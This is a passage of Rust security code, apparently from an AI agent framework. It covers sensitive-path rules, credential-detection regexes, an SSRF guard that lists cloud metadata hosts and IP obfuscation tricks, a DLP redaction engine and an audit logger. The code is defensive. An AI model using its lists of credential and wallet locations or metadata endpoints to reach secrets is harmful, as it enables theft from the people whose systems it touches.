                 SensitiveCategory::CryptoWallets, Severity::Critical, "Electrum wallet"),
                (r"(?i)(^|/)\.metamask/",
                 SensitiveCategory::CryptoWallets, Severity::Critical, "MetaMask data"),
                // Browser profiles (2)
                (r"(?i)(^|/)(\.mozilla|\.config/google-chrome|\.config/chromium|Library/Application Support/(Google/Chrome|Firefox))/",
                 SensitiveCategory::BrowserProfiles, Severity::Critical, "Browser profile dir"),
                (r"(?i)(cookies|login\s*data|web\s*data)(\.sqlite)?$",
                 SensitiveCategory::BrowserProfiles, Severity::Critical, "Browser credential DB"),
                // Password stores (4)
                (r"(?i)(^|/)\.password-store/",
                 SensitiveCategory::PasswordStores, Severity::Critical, "pass store"),
                (r"(?i)(^|/)\.local/share/keyrings/",
                 SensitiveCategory::PasswordStores, Severity::Critical, "GNOME Keyring"),
                (r"(?i)(^|/)Library/Keychains/",
                 SensitiveCategory::PasswordStores, Severity::Critical, "macOS Keychain"),
                (r"(?i)(^|/)(\.keepass|\.kdbx?|\.1password)",
                 SensitiveCategory::PasswordStores, Severity::Critical, "Password manager DB"),
                // Certs and keys (2)
                (r"(?i)\.(pem|p12|pfx|jks|keystore|key|crt|cer)$",
                 SensitiveCategory::CertificatesKeys, Severity::High, "Certificate/key file"),
                (r"(?i)(^|/)\.gnupg/(private-keys|secring|trustdb)",
                 SensitiveCategory::CertificatesKeys, Severity::Critical, "GPG private key"),
                // Environment (2)
                (r"(?i)(^|/)\.env(\.[a-z]+)?$",
                 SensitiveCategory::EnvironmentFiles, Severity::High, "Environment file"),
                (r"(?i)(^|/)\.netrc$",
                 SensitiveCategory::EnvironmentFiles, Severity::High, "Netrc file"),
                // System creds (2)
                (r"(?i)^/etc/(shadow|gshadow|master\.passwd)$",
                 SensitiveCategory::SystemCredentials, Severity::Critical, "System password DB"),
                (r"(?i)^/etc/(sudoers|pam\.d/)",
                 SensitiveCategory::SystemCredentials, Severity::High, "System auth config"),
                // Database creds (2)
                (r"(?i)(^|/)\.(pgpass|my\.cnf|mongorc\.js|dbshell)$",
                 SensitiveCategory::DatabaseCredentials, Severity::High, "Database credential file"),
                (r"(?i)(^|/)\.config/redis",
                 SensitiveCategory::DatabaseCredentials, Severity::High, "Redis config"),
                // API tokens (3)
                (r"(?i)(^|/)\.(npmrc|pypirc|gem/credentials|cargo/credentials)$",
                 SensitiveCategory::ApiTokens, Severity::High, "Package registry credentials"),
                (r"(?i)(^|/)\.github/token$",
                 SensitiveCategory::ApiTokens, Severity::High, "GitHub token file"),
                (r"(?i)(^|/)\.heroku/credentials$",
                 SensitiveCategory::ApiTokens, Severity::High, "Heroku API credentials"),
            ];

            rules
                .into_iter()
                .map(|(pat, cat, sev, desc)| {
                    Ok(SensitivePathRule {
                        pattern: Regex::new(pat)?,
                        category: cat,
                        severity: sev,
                        description: desc.to_string(),
                    })
                })
                .collect()
        }

        fn build_credential_patterns() -> Result<Vec<CredentialPattern>> {
            let patterns: Vec<(&str, &str, Severity)> = vec![
                // AWS (2)
                (r"(?i)AKIA[0-9A-Z]{16}", "AWS Access Key ID", Severity::Critical),
                (r"(?i)aws_secret_access_key\s*=\s*\S{40}", "AWS Secret Access Key", Severity::Critical),
                // GCP (2)
                (r#"(?i)"type"\s*:\s*"service_account""#, "GCP Service Account JSON", Severity::Critical),
                (r"(?i)AIza[0-9A-Za-z\-_]{35}", "Google API Key", Severity::High),
                // Azure (1)
                (r"AccountKey=[A-Za-z0-9+/=]{86}==", "Azure Storage Account Key", Severity::Critical),
                // Private keys (2)
                (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", "Private Key (PEM)", Severity::Critical),
                (r"-----BEGIN PGP PRIVATE KEY BLOCK-----", "PGP Private Key", Severity::Critical),
                // JWT (1)
                (r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", "JWT Token", Severity::High),
                // GitHub (2)
                (r"(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36}", "GitHub Token", Severity::Critical),
                (r"github_pat_[A-Za-z0-9_]{82}", "GitHub PAT (fine-grained)", Severity::Critical),
                // Slack (1)
                (r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*", "Slack Token", Severity::High),
                // Stripe (1)
                (r"(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}", "Stripe API Key", Severity::Critical),
                // Database URIs (1)
                (r"(?i)(mysql|postgres|mongodb|redis)://[^:]+:[^@]+@", "Database URI with Password", Severity::Critical),
                // Generic (1)
                (r#"(?i)(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[:=]\s*['"][A-Za-z0-9+/=_-]{20,}['"]"#,
                 "Generic API Key/Secret", Severity::High),
                // SSH binary (1)
                (r"openssh-key-v1", "OpenSSH Private Key (binary)", Severity::Critical),
                // Anthropic (1)
                (r"sk-ant-[A-Za-z0-9_-]{40,}", "Anthropic API Key", Severity::Critical),
                // OpenAI (1)
                (r"sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}", "OpenAI API Key", Severity::Critical),
                // Telegram (1)
                (r"\d{8,10}:[A-Za-z0-9_-]{35}", "Telegram Bot Token", Severity::High),
                // Discord (1)
                (r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}", "Discord Bot Token", Severity::High),
                // Sendgrid (1)
                (r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}", "SendGrid API Key", Severity::High),
            ];

            patterns
                .into_iter()
                .map(|(pat, ctype, sev)| {
                    Ok(CredentialPattern {
                        pattern: Regex::new(pat)?,
                        credential_type: ctype.to_string(),
                        severity: sev,
                    })
                })
                .collect()
        }
    }

    impl std::fmt::Display for Severity {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            match self {
                Severity::Critical => write!(f, "CRITICAL"),
                Severity::High => write!(f, "HIGH"),
                Severity::Medium => write!(f, "MEDIUM"),
                Severity::Low => write!(f, "LOW"),
            }
        }
    }

    impl std::fmt::Display for SensitiveCategory {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            match self {
                SensitiveCategory::SshKeys => write!(f, "SSH Keys"),
                SensitiveCategory::CloudCredentials => write!(f, "Cloud Credentials"),
                SensitiveCategory::CryptoWallets => write!(f, "Crypto Wallets"),
                SensitiveCategory::BrowserProfiles => write!(f, "Browser Profiles"),
                SensitiveCategory::PasswordStores => write!(f, "Password Stores"),
                SensitiveCategory::CertificatesKeys => write!(f, "Certificates/Keys"),
                SensitiveCategory::EnvironmentFiles => write!(f, "Environment Files"),
                SensitiveCategory::SystemCredentials => write!(f, "System Credentials"),
                SensitiveCategory::DatabaseCredentials => write!(f, "Database Credentials"),
                SensitiveCategory::ApiTokens => write!(f, "API Tokens"),
            }
        }
    }
}

// ---------------------------------------------------------------------------
// 4. SSRF Protection
// ---------------------------------------------------------------------------
pub mod ssrf {
    use super::*;

    #[derive(Debug, Clone)]
    struct MetadataEndpoint {
        host: String,
        description: String,
        cloud_provider: String,
    }

    #[derive(Debug, Clone)]
    pub struct SsrfCheckResult {
        pub allowed: bool,
        pub reason: Option<String>,
    }

    /// SSRF Guard -- prevents server-side request forgery via URL and IP validation.
    pub struct SsrfGuard {
        metadata_endpoints: Vec<MetadataEndpoint>,
        block_private: bool,
        blocked_domains: Vec<String>,
        allowed_domains: Vec<String>,
    }

    impl SsrfGuard {
        pub fn new(
            block_private: bool,
            blocked_domains: Vec<String>,
            allowed_domains: Vec<String>,
        ) -> Self {
            let metadata_endpoints = vec![
                MetadataEndpoint {
                    host: "169.254.169.254".into(),
                    description: "AWS/GCP Instance Metadata Service".into(),
                    cloud_provider: "AWS/GCP".into(),
                },
                MetadataEndpoint {
                    host: "metadata.google.internal".into(),
                    description: "GCP Metadata Service (DNS)".into(),
                    cloud_provider: "GCP".into(),
                },
                MetadataEndpoint {
                    host: "metadata.azure.com".into(),
                    description: "Azure Instance Metadata Service".into(),
                    cloud_provider: "Azure".into(),
                },
                MetadataEndpoint {
                    host: "169.254.170.2".into(),
                    description: "AWS ECS Task Metadata".into(),
                    cloud_provider: "AWS".into(),
                },
                MetadataEndpoint {
                    host: "100.100.100.200".into(),
                    description: "Alibaba Cloud Metadata".into(),
                    cloud_provider: "Alibaba".into(),
                },
                MetadataEndpoint {
                    host: "169.254.169.123".into(),
                    description: "AWS Time Sync (link-local)".into(),
                    cloud_provider: "AWS".into(),
                },
                MetadataEndpoint {
                    host: "fd00:ec2::254".into(),
                    description: "AWS IMDSv2 IPv6".into(),
                    cloud_provider: "AWS".into(),
                },
            ];

            info!(
                metadata = metadata_endpoints.len(),
                block_private = block_private,
                "SSRF Guard initialized"
            );

            Self {
                metadata_endpoints,
                block_private,
                blocked_domains,
                allowed_domains,
            }
        }

        /// Validate a URL for SSRF attacks.
        pub fn check_url(&self, url: &str) -> SsrfCheckResult {
            if let Err(reason) = self.validate_scheme(url) {
                return SsrfCheckResult { allowed: false, reason: Some(reason) };
            }

            let host = match self.extract_host(url) {
                Some(h) => h,
                None => {
                    return SsrfCheckResult {
                        allowed: false,
                        reason: Some("Cannot extract host from URL".into()),
                    };
                }
            };

            if let Some(ep) = self.is_metadata_endpoint(&host) {
                return SsrfCheckResult {
                    allowed: false,
                    reason: Some(format!(
                        "Blocked cloud metadata endpoint: {} ({})",
                        ep.description, ep.cloud_provider
                    )),
                };
            }

            if self.is_blocked_domain(&host) {
                return SsrfCheckResult {
                    allowed: false,
                    reason: Some(format!("Domain '{}' is in the block list", host)),
                };
            }

            if !self.allowed_domains.is_empty() && !self.is_allowed_domain(&host) {
                return SsrfCheckResult {
                    allowed: false,
                    reason: Some(format!("Domain '{}' is not in the allow list", host)),
                };
            }

            if let Ok(ip) = host.parse::<IpAddr>() {
                if let Err(reason) = self.check_ip(ip) {
                    return SsrfCheckResult { allowed: false, reason: Some(reason) };
                }
            }

            if let Err(reason) = self.check_ip_obfuscation(&host) {
                return SsrfCheckResult { allowed: false, reason: Some(reason) };
            }

            SsrfCheckResult { allowed: true, reason: None }
        }

        /// Validate an IP obtained after DNS resolution (DNS rebinding prevention).
        pub fn check_resolved_ip(&self, ip: IpAddr) -> SsrfCheckResult {
            match self.check_ip(ip) {
                Ok(()) => SsrfCheckResult { allowed: true, reason: None },
                Err(reason) => SsrfCheckResult {
                    allowed: false,
                    reason: Some(format!("DNS resolution returned blocked IP: {}", reason)),
                },
            }
        }

        // ---- internal helpers ----

        fn validate_scheme(&self, url: &str) -> Result<(), String> {
            let lower = url.to_lowercase();
            if lower.starts_with("https://") || lower.starts_with("http://") {
                Ok(())
            } else if lower.starts_with("file://") {
                Err("file:// scheme blocked -- potential local file read".into())
            } else if lower.starts_with("gopher://") {
                Err("gopher:// scheme blocked -- known SSRF vector".into())
            } else if lower.starts_with("dict://") {
                Err("dict:// scheme blocked -- known SSRF vector".into())
            } else if lower.starts_with("ftp://") {
                Err("ftp:// scheme blocked -- unencrypted protocol".into())
            } else if lower.starts_with("data:") {
                Err("data: URI blocked -- potential injection vector".into())
            } else {
                Err("Unknown URL scheme -- only http/https allowed".into())
            }
        }

        fn extract_host(&self, url: &str) -> Option<String> {
            let without_scheme = url
                .strip_prefix("https://")
                .or_else(|| url.strip_prefix("http://"))
                .unwrap_or(url);

            // Handle userinfo@ prefix (confusion attack vector)
            let after_userinfo = if let Some(at_pos) = without_scheme.find('@') {
                let slash_pos = without_scheme.find('/').unwrap_or(without_scheme.len());
                if at_pos < slash_pos {
                    &without_scheme[at_pos + 1..]
                } else {
                    without_scheme
                }
            } else {
                without_scheme
            };

            let host = after_userinfo
                .split('/')
                .next()
                .unwrap_or(after_userinfo)
                .split('?')
                .next()
                .unwrap_or(after_userinfo)
                .split('#')
                .next()
                .unwrap_or(after_userinfo);

            let host = if host.starts_with('[') {
                host.split(']').next().map(|h| format!("{}]", h))
            } else {
                Some(host.rsplit(':').last().unwrap_or(host).to_string())
            };

            host.map(|h| h.trim_matches(|c| c == '[' || c == ']').to_string())
        }

        fn is_metadata_endpoint(&self, host: &str) -> Option<&MetadataEndpoint> {
            let hl = host.to_lowercase();
            self.metadata_endpoints.iter().find(|ep| hl == ep.host.to_lowercase())
        }

        fn is_blocked_domain(&self, host: &str) -> bool {
            let hl = host.to_lowercase();
            self.blocked_domains.iter().any(|d| {
                let dl = d.to_lowercase();
                if dl.starts_with("*.") {
                    hl.ends_with(&dl[1..])
                } else {
                    hl == dl
                }
            })
        }

        fn is_allowed_domain(&self, host: &str) -> bool {
            let hl = host.to_lowercase();
            self.allowed_domains.iter().any(|d| {
                let dl = d.to_lowercase();
                if dl.starts_with("*.") {
                    hl.ends_with(&dl[1..])
                } else {
                    hl == dl
                }
            })
        }

        fn check_ip(&self, ip: IpAddr) -> Result<(), String> {
            if !self.block_private {
                return Ok(());
            }
            match ip {
                IpAddr::V4(v4) => self.check_ipv4(v4),
                IpAddr::V6(v6) => self.check_ipv6(v6),
            }
        }

        fn check_ipv4(&self, ip: Ipv4Addr) -> Result<(), String> {
            let o = ip.octets();
            if o[0] == 127 {
                return Err(format!("Loopback address blocked: {}", ip));
            }
            if o[0] == 169 && o[1] == 254 {
                return Err(format!("Link-local address blocked: {}", ip));
            }
            if o[0] == 10 {
                return Err(format!("Private network (10.0.0.0/8) blocked: {}", ip));
            }
            if o[0] == 172 && (16..=31).contains(&o[1]) {
                return Err(format!("Private network (172.16.0.0/12) blocked: {}", ip));
            }
            if o[0] == 192 && o[1] == 168 {
                return Err(format!("Private network (192.168.0.0/16) blocked: {}", ip));
            }
            if o[0] == 100 && (64..=127).contains(&o[1]) {
                return Err(format!("CGNAT (100.64.0.0/10) blocked: {}", ip));
            }
            if o == [255, 255, 255, 255] {
                return Err("Broadcast address blocked".into());
            }
            if o == [0, 0, 0, 0] {
                return Err("Unspecified address (0.0.0.0) blocked".into());
            }
            if (o[0] == 192 && o[1] == 0 && o[2] == 2)
                || (o[0] == 198 && o[1] == 51 && o[2] == 100)
                || (o[0] == 203 && o[1] == 0 && o[2] == 113)
            {
                return Err(format!("Documentation range blocked: {}", ip));
            }
            Ok(())
        }

        fn check_ipv6(&self, ip: Ipv6Addr) -> Result<(), String> {
            if ip == Ipv6Addr::LOCALHOST {
                return Err("IPv6 loopback (::1) blocked".into());
            }
            if ip == Ipv6Addr::UNSPECIFIED {
                return Err("IPv6 unspecified (::) blocked".into());
            }
            let seg = ip.segments();
            if (seg[0] & 0xffc0) == 0xfe80 {
                return Err(format!("IPv6 link-local blocked: {}", ip));
            }
            if (seg[0] & 0xfe00) == 0xfc00 {
                return Err(format!("IPv6 unique local blocked: {}", ip));
            }
            // IPv4-mapped IPv6 bypass prevention
            if seg[0..5] == [0, 0, 0, 0, 0] && seg[5] == 0xffff {
                let v4 = Ipv4Addr::new(
                    (seg[6] >> 8) as u8,
                    (seg[6] & 0xff) as u8,
                    (seg[7] >> 8) as u8,
                    (seg[7] & 0xff) as u8,
                );
                return self
                    .check_ipv4(v4)
                    .map_err(|e| format!("IPv4-mapped IPv6: {}", e));
            }
            Ok(())
        }

        fn check_ip_obfuscation(&self, host: &str) -> Result<(), String> {
            // Decimal IP (e.g., 2130706433 = 127.0.0.1)
            if let Ok(decimal) = host.parse::<u32>() {
                let ip = Ipv4Addr::from(decimal);
                if self.check_ipv4(ip).is_err() {
                    return Err(format!(
                        "Decimal IP obfuscation detected: {} resolves to {}",
                        host, ip
                    ));
                }
            }
            // Octal IP
            if host.contains('.') && host.starts_with('0') && !host.starts_with("0.") {
                return Err(format!("Possible octal IP obfuscation: {}", host));
            }
            // Hex IP
            if host.starts_with("0x") || host.starts_with("0X") {
                if let Ok(decimal) = u32::from_str_radix(&host[2..], 16) {
                    let ip = Ipv4Addr::from(decimal);
                    return Err(format!(
                        "Hex IP obfuscation detected: {} resolves to {}",
                        host, ip
                    ));
                }
            }
            Ok(())
        }
    }
}

// ---------------------------------------------------------------------------
// 5. DLP Engine
// ---------------------------------------------------------------------------
pub mod dlp {
    use super::*;

    #[derive(Debug, Clone, PartialEq, Eq)]
    pub enum DlpAction {
        Block,
        Redact,
        Warn,
    }

    #[derive(Debug, Clone, PartialEq, Eq)]
    pub enum DataType {
        AwsCredential,
        GcpCredential,
        AzureCredential,
        PrivateKey,
        DatabaseUri,
        JwtToken,
        ApiKey,
        SshKey,
        GenericSecret,
        PersonalInfo,
    }

    #[derive(Debug, Clone)]
    pub struct DlpRule {
        pub id: String,
        pub pattern: Regex,
        pub data_type: DataType,
        pub action: DlpAction,
        pub description: String,
        pub redaction: String,
    }

    #[derive(Debug, Clone)]
    pub struct DlpResult {
        pub output: String,
        pub blocked: bool,
        pub findings: Vec<DlpFinding>,
    }

    #[derive(Debug, Clone)]
    pub struct DlpFinding {
        pub rule_id: String,
        pub data_type: DataType,
        pub action_taken: DlpAction,
        pub description: String,
        pub matched_length: usize,
    }

    /// DLP Engine -- scans all tool outputs for sensitive data before they reach
    /// the LLM or the user.
    pub struct DlpEngine {
        rules: Vec<DlpRule>,
        #[allow(dead_code)]
        default_action: DlpAction,
        enabled: bool,
    }

    impl DlpEngine {
        pub fn new(enabled: bool, default_action: DlpAction) -> Result<Self> {
            let rules = Self::build_rules(default_action.clone())?;
            info!(rules = rules.len(), enabled = enabled, "DLP engine initialized");
            Ok(Self { rules, default_action, enabled })
        }

        /// Scan output text; apply Block / Redact / Warn actions per rule.
        pub fn scan_output(&self, output: &str) -> DlpResult {
            if !self.enabled {
                return DlpResult {
                    output: output.to_string(),
                    blocked: false,
                    findings: vec![],
                };
            }

            let mut findings = Vec::new();
            let mut result = output.to_string();
            let mut should_block = false;

            for rule in &self.rules {
                if rule.pattern.is_match(&result) {
                    let count = rule.pattern.find_iter(&result).count();
                    findings.push(DlpFinding {
                        rule_id: rule.id.clone(),
                        data_type: rule.data_type.clone(),
                        action_taken: rule.action.clone(),
                        description: format!("{} ({} occurrence(s))", rule.description, count),
                        matched_length: rule
                            .pattern
                            .find(&result)
                            .map(|m| m.len())
                            .unwrap_or(0),
                    });

                    match &rule.action {
                        DlpAction::Block => {
                            should_block = true;
                            warn!(rule = %rule.id, "DLP: blocked output");
                        }
                        DlpAction::Redact => {
                            result = rule
                                .pattern
                                .replace_all(&result, rule.redaction.as_str())
                                .to_string();
                            warn!(rule = %rule.id, "DLP: redacted output");
                        }
                        DlpAction::Warn => {
                            warn!(rule = %rule.id, "DLP: warning -- sensitive data");
                        }
                    }
                }
            }

            if should_block {
                DlpResult {
                    output: "[DLP BLOCKED] Output contained sensitive data. Check audit log."
                        .to_string(),
                    blocked: true,
                    findings,
                }
            } else {
                DlpResult { output: result, blocked: false, findings }
            }
        }

        pub fn rule_count(&self) -> usize {
            self.rules.len()
        }

        fn build_rules(default_action: DlpAction) -> Result<Vec<DlpRule>> {
            let mut rules = Vec::new();

            // Helper closure
            let mut add = |id: &str, pat: &str, dt: DataType, act: DlpAction, desc: &str, red: &str| -> Result<()> {
                rules.push(DlpRule {
                    id: id.to_string(),
                    pattern: Regex::new(pat)?,
                    data_type: dt,
                    action: act,
                    description: desc.to_string(),
                    redaction: red.to_string(),
                });
                Ok(())
            };

            // Private keys -- always block (4)
            add("private-key-rsa",
                r"-----BEGIN (RSA )?PRIVATE KEY-----[\s\S]*?-----END (RSA )?PRIVATE KEY-----",
                DataType::PrivateKey, DlpAction::Block,
                "RSA private key", "[PRIVATE KEY REDACTED]")?;
            add("private-key-ec",
                r"-----BEGIN EC PRIVATE KEY-----[\s\S]*?-----END EC PRIVATE KEY-----",
                DataType::PrivateKey, DlpAction::Block,
                "EC private key", "[PRIVATE KEY REDACTED]")?;
            add("private-key-openssh",
                r"-----BEGIN OPENSSH PRIVATE KEY-----[\s\S]*?-----END OPENSSH PRIVATE KEY-----",
                DataType::SshKey, DlpAction::Block,
                "OpenSSH private key", "[SSH KEY REDACTED]")?;
            add("private-key-pgp",
                r"-----BEGIN PGP PRIVATE KEY BLOCK-----[\s\S]*?-----END PGP PRIVATE KEY BLOCK-----",
                DataType::PrivateKey, DlpAction::Block,
                "PGP private key", "[PGP KEY REDACTED]")?;

            // AWS (2)
            add("aws-access-key",
                r"(?i)(AKIA[0-9A-Z]{16})",
                DataType::AwsCredential, default_action.clone(),
                "AWS Access Key ID", "[AWS_KEY_REDACTED]")?;
            add("aws-secret-key",
                r"(?i)aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})",
                DataType::AwsCredential, DlpAction::Block,
                "AWS Secret Access Key", "aws_secret_access_key = [REDACTED]")?;

            // GCP (2)
            add("gcp-service-account",
                r#"(?i)"type"\s*:\s*"service_account"[\s\S]*?"private_key"\s*:"#,
                DataType::GcpCredential, DlpAction::Block,
                "GCP service account JSON", "[GCP_SERVICE_ACCOUNT_REDACTED]")?;
            add("gcp-api-key",
                r"AIza[0-9A-Za-z\-_]{35}",
                DataType::GcpCredential, default_action.clone(),
                "Google API key", "[GOOGLE_API_KEY_REDACTED]")?;

            // Azure (1)
            add("azure-storage-key",
                r"AccountKey=[A-Za-z0-9+/=]{86}==",
                DataType::AzureCredential, DlpAction::Block,
                "Azure Storage Account Key", "AccountKey=[REDACTED]")?;

            // Database URIs (1)
            add("database-uri",
                r"(?i)(mysql|postgres|postgresql|mongodb|redis|amqp)://[^:]+:[^@\s]+@[^\s]+",
                DataType::DatabaseUri, default_action.clone(),
                "Database URI with password", "[DATABASE_URI_REDACTED]")?;

            // JWT (1)
            add("jwt-token",
                r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
                DataType::JwtToken, default_action.clone(),
                "JWT token", "[JWT_REDACTED]")?;

            // API keys (8)
            add("github-token",
                r"(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36}",
                DataType::ApiKey, default_action.clone(),
                "GitHub token", "[GITHUB_TOKEN_REDACTED]")?;
            add("github-pat-fine",
                r"github_pat_[A-Za-z0-9_]{82}",
                DataType::ApiKey, default_action.clone(),
                "GitHub fine-grained PAT", "[GITHUB_PAT_REDACTED]")?;
            add("slack-token",
                r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*",
                DataType::ApiKey, default_action.clone(),
                "Slack token", "[SLACK_TOKEN_REDACTED]")?;
            add("stripe-key",
                r"(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}",
                DataType::ApiKey, default_action.clone(),
                "Stripe API key", "[STRIPE_KEY_REDACTED]")?;
            add("anthropic-key",
                r"sk-ant-[A-Za-z0-9_-]{40,}",
                DataType::ApiKey, DlpAction::Block,
                "Anthropic API key", "[ANTHROPIC_KEY_REDACTED]")?;
            add("openai-key",
                r"sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}",
                DataType::ApiKey, DlpAction::Block,
                "OpenAI API key", "[OPENAI_KEY_REDACTED]")?;
            add("telegram-token",
                r"\d{8,10}:[A-Za-z0-9_-]{35}",
                DataType::ApiKey, default_action.clone(),
                "Telegram bot token", "[TELEGRAM_TOKEN_REDACTED]")?;
            add("sendgrid-key",
                r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}",
                DataType::ApiKey, default_action.clone(),
                "SendGrid API key", "[SENDGRID_KEY_REDACTED]")?;

            // Generic secrets (2)
            add("generic-password",
                r#"(?i)(password|passwd|pwd)\s*[:=]\s*["'][^"']{8,}["']"#,
                DataType::GenericSecret, default_action.clone(),
                "Password assignment", "[PASSWORD_REDACTED]")?;
            add("generic-secret",
                r#"(?i)(secret|secret_key|api_secret)\s*[:=]\s*["'][^"']{16,}["']"#,
                DataType::GenericSecret, default_action.clone(),
                "Secret value assignment", "[SECRET_REDACTED]")?;

            // /etc/shadow (1)
            add("shadow-content",
                r"(?m)^[a-z_][a-z0-9_-]*:\$[0-9a-z]+\$[^\n:]+:[0-9]*:",
                DataType::GenericSecret, DlpAction::Block,
                "Password hash from /etc/shadow", "[SHADOW_CONTENT_REDACTED]")?;

            Ok(rules)
        }
    }

    impl std::fmt::Display for DlpAction {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            match self {
                DlpAction::Block => write!(f, "BLOCK"),
                DlpAction::Redact => write!(f, "REDACT"),
                DlpAction::Warn => write!(f, "WARN"),
            }
        }
    }

    impl std::fmt::Display for DataType {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            match self {
                DataType::AwsCredential => write!(f, "AWS Credential"),
                DataType::GcpCredential => write!(f, "GCP Credential"),
                DataType::AzureCredential => write!(f, "Azure Credential"),
                DataType::PrivateKey => write!(f, "Private Key"),
                DataType::DatabaseUri => write!(f, "Database URI"),
                DataType::JwtToken => write!(f, "JWT Token"),
                DataType::ApiKey => write!(f, "API Key"),
                DataType::SshKey => write!(f, "SSH Key"),
                DataType::GenericSecret => write!(f, "Generic Secret"),
                DataType::PersonalInfo => write!(f, "Personal Information"),
            }
        }
    }
}

// ---------------------------------------------------------------------------
// 6. Audit Logger
// ---------------------------------------------------------------------------
pub mod audit {
    use super::*;
    use crate::core::config::AuditConfig;

    #[derive(Debug, Clone, Copy, Serialize, Deserialize)]
    pub enum AuditSeverity {
        Info,
        Warning,
        Alert,
        Critical,
    }

    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct AuditEntry {
        pub timestamp: String,
        pub event_type: String,
        pub data: serde_json::Value,
        pub severity: AuditSeverity,
    }

    /// SIEM export endpoint configuration.
    #[derive(Debug, Clone)]
    pub enum SiemEndpoint {
        /// RFC 5424 syslog over TCP/UDP
        Syslog(String),
        /// HTTP(S) webhook / log ingestion
        Http(String),
        /// Kafka topic
        Kafka { brokers: String, topic: String },
    }

    /// Structured audit log with JSON-lines output, PII redaction, and SIEM export.
    pub struct AuditLog {
        path: String,
        enabled: bool,
        writer: Option<Mutex<std::io::BufWriter<std::fs::File>>>,
        redact_patterns: Vec<Regex>,
        #[allow(dead_code)]
        siem_endpoint: Option<SiemEndpoint>,
    }

    impl AuditLog {
        pub fn new(config: &AuditConfig) -> Result<Self> {
            let writer = if config.enabled {
                let path = shellexpand(&config.path);

                if let Some(parent) = std::path::Path::new(&path).parent() {
                    std::fs::create_dir_all(parent)?;
                }

                let file = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&path)?;

                // 0600 permissions
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let meta = file.metadata()?;
                    let mut perms = meta.permissions();
                    perms.set_mode(0o600);
                    std::fs::set_permissions(&path, perms)?;
                }

                Some(Mutex::new(std::io::BufWriter::new(file)))
            } else {
                None
            };

            // PII redaction patterns (5+)
            let redact_patterns = vec![
                Regex::new(r"(?i)(api[_-]?key|token|secret|password|credential)\s*[:=]\s*\S+")?,
                Regex::new(r"(?i)bearer\s+\S+")?,
                Regex::new(r"\b[A-Za-z0-9+/]{40,}={0,2}\b")?,
                Regex::new(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")?,
                Regex::new(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")?,
                Regex::new(r"\b\d{3}-\d{2}-\d{4}\b")?, // SSN pattern
            ];

            let siem_endpoint = if config.siem_export {
                config
                    .siem_endpoint
                    .as_ref()
                    .map(|ep| {
                        if ep.starts_with("http") {
                            SiemEndpoint::Http(ep.clone())
                        } else if ep.starts_with("kafka://") {
                            SiemEndpoint::Kafka {
                                brokers: ep
                                    .strip_prefix("kafka://")
                                    .unwrap_or(ep)
                                    .to_string(),
                                topic: "ironclaw-audit".to_string(),
                            }
                        } else {
                            SiemEndpoint::Syslog(ep.clone())
                        }
                    })
            } else {
                None
            };

            Ok(Self {
                path: config.path.clone(),
                enabled: config.enabled,
                writer,
                redact_patterns,
                siem_endpoint,
            })
        }

        /// Log a security-relevant event.
        pub fn log_event(
            &self,
            event_type: &str,
            data: &serde_json::Value,
        ) -> Result<()> {
            if !self.enabled {
                return Ok(());
            }
            let severity = Self::classify_severity(event_type);
            let entry = AuditEntry {
                timestamp: Utc::now().to_rfc3339(),
                event_type: event_type.to_string(),
                data: self.redact_pii(data),
                severity,
            };
            self.write_entry(&entry)
        }

        /// Log a security alert (elevated severity, also printed to stderr).
        pub fn log_alert(
            &self,
            event_type: &str,
            data: &serde_json::Value,
        ) -> Result<()> {
            let entry = AuditEntry {
                timestamp: Utc::now().to_rfc3339(),
                event_type: format!("ALERT:{}", event_type),
                data: self.redact_pii(data),
                severity: AuditSeverity::Alert,
            };
            eprintln!("[SECURITY ALERT] {}: {}", event_type, entry.data);
            self.write_entry(&entry)
        }

        /// Read recent audit entries from the log file.
        pub fn read_recent(&self, count: usize) -> Result<Vec<AuditEntry>> {
            let path = shellexpand(&self.path);
            if !std::path::Path::new(&path).exists() {
                return Ok(Vec::new());
            }
            let content = std::fs::read_to_string(&path)?;
            let entries: Vec<AuditEntry> = content
                .lines()
                .filter_map(|line| serde_json::from_str(line).ok())
                .collect();
            let start = entries.len().saturating_sub(count);
            Ok(entries[start..].to_vec())
        }

        // ---- internal ----

        fn write_entry(&self, entry: &AuditEntry) -> Result<()> {
            if let Some(ref writer) = self.writer {
                let json = serde_json::to_string(entry)?;
                let mut w = writer.lock();
                writeln!(w, "{}", json)?;
                w.flush()?;
            }
            Ok(())
        }

        fn redact_pii(&self, data: &serde_json::Value) -> serde_json::Value {
            match data {
                serde_json::Value::String(s) => {
                    let mut result = s.clone();
                    for pat in &self.redact_patterns {
                        result = pat.replace_all(&result, "[REDACTED]").to_string();
                    }
                    serde_json::Value::String(result)
                }
                serde_json::Value::Object(map) => {
